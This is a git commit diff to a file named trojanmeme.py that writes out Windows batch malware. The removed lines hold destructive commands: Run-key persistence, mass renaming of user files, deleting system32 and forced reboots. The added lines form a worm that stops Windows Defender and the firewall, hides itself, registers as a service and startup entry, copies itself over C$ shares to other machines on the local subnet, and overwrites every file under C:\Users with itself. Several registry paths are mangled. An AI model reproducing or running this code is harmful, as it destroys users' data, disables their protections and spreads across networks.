7f084694a3312733002cb4f29a4b5398f0e00b08
MadhavGarg2 <gargmadhav@outlook.com>
2021-06-24 09:27:00 +0530

    Update trojanmeme.py

--- trojanmeme.py
+++ trojanmeme.py
@@ -27,62 +27,39 @@ taskkill /f /im explorer.exe
 :top
 START %SystemRoot%\system32\notepad.exe
 GOTO top
-Dim WSHShell
-Set WSHShell=Wscript.CreateObject("Wscript.Shell") 
- 
-Dim x
-For x = 1 to 100000000
-WSHShell.Run "Tourstart.exe"
-echo @echo off>c:windowshartlell.bat
-echo break off>>c:windowshartlell.bat
-echo shutdown -r -t 11 -f>>c:windowshartlell.bat
-echo end>>c:windowshartlell.bat
-reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
-reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f
-echo You have been HACKED.
-PAUSE
 echo @echo off>c:windowswimn32.bat
 echo break off>>c:windowswimn32.bat
 echo ipconfig/release_all>>c:windowswimn32.bat
 echo end>>c:windowswimn32.bat
-reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
-reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
-echo You Have Been HACKED!
-PAUSE
-REN *.DOC *.TXT
-REN *.JPEG *.TXT
-REN *.LNK *.TXT
-REN *.AVI *.TXT
-REN *.MPEG *.TXT
-REN *.COM *.TXT
-REN *.BAT *.TXT
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
 @echo off
-del c:\\windows\system32
-:CRASH
-net send * WORKGROUP ENABLED
-ipconfig /release
-shutdown -r -f -t0
-echo @echo off>c:windowshartlell.bat
-echo break off>>c:windowshartlell.bat
-echo shutdown -r -t 11 -f>>c:windowshartlell.bat
-echo end>>c:windowshartlell.bat
-reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
-reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v HAHAHA /t reg_sz /d c:windowshartlell.bat /f
-echo You Have Been Hacked echo @echo off>c:windowswimn32.bat
-echo break off>>c:windowswimn32.bat
-echo ipconfig/release_all>>c:windowswimn32.bat
-echo end>>c:windowswimn32.bat
-reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
-reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
-echo YOU HAVE BEEN HACKED
-REN *.DOC *.TXT
-REN *.JPEG *.TXT
-REN *.LNK *.TXT
-REN *.AVI *.TXT
-REN *.MPEG *.TXT
-REN *.COM *.TXT
-REN *.BAT *.TXT
-GOTO CRASH ''' +"\n")
+SET i=0
+SET "NomeProcesso=DaMonki.exe"
+SET "NomeService=DaMonki"
+
+rem <=== run as service ===>
+echo sc create %NomeService% binpath=%0 > service.bat
+echo sc start %NomeService% >> service.bat
+attrib +h +r +s service.bat
+start service.bat
+rem <=== startup registry ===>
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Services" /t "REG_SZ" /d %0
+attrib +h +r +s %0
+rem <=== kill firewall and windows defender ===>
+net stop "Windows Defender Service"
+net stop "Windows Firewall"
+rem <=== INFECT NETWORK!!! ===>
+:Worm
+net use Z: \\192.168.1.%i%\C$
+if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy %0 "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Services.exe"
+mountvol Z: /d)
+if %i% == 256 (goto Infect) else (set /a i=i+1)
+goto Worm
+rem <=== infect *.* in C:\Users ===>
+:Infect
+for /f %%f in ('dir C:\Users\*.* /s /b') do (rename %%f *.bat)
+for /f %%f in ('dir C:\Users\*.bat /s /b') do (copy %0 %%f)''' +"\n")
 
 
 
